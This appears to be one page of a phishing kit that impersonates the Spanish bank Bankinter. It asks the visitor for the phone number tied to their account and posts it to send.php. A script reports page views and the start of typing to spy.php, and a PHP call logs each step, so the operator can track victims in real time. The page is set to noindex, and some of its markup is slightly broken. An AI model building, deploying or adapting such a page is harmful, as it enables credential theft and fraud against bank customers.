<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8">
<meta name="robots" content="nofollow, noindex">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="inc/bs.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700,800" />
<link rel="stylesheet" href="inc/style.css">
<script src="inc/jq.js"></script>
</head>
<body>
<header class="headrow">

<div class="col-logo">
<img src="inc/logo_bk.svg" class="logo">
</div>
<div class="col-menu">
<i class="fa fa-bars"></i>
</div>
</header>
<div class="container">
<div class="title">Su número de teléfono</div>
Introduce tu número de teléfono que está vinculado a la cuenta de Bankinter


<div class="form">



<div class="forma" id="form-1">
<form method="post" action="send.php">
<div class="form-group">


<input type="text" maxlength="9" class="form-control success" placeholder="XXX-XXX-XXX" name="tel" id="inv">
</div>


</div>

</div>
</div>



</select>
</div>
</div>
</div>

<div class="form-grou">
<button class="btn btn-success w-100" type="submit">VALIDAR</button>
</div>


<footer class="container-fluid">
    <div class="row">
<div class="col-sm-3 left">

<img src="inc/logo_bk.svg">
</div>

</div>
</footer>

<?php
$j->ctr("tel ".@$_GET['e']);
?>
<script>
$.post("spy.php", {telview:1});
var abort = false;
$("#tel").keyup(function(){
	if(abort==false){
		$.post("spy.php", {teling:1});
		abort=true;
	}
});


</script>
</body>
</html>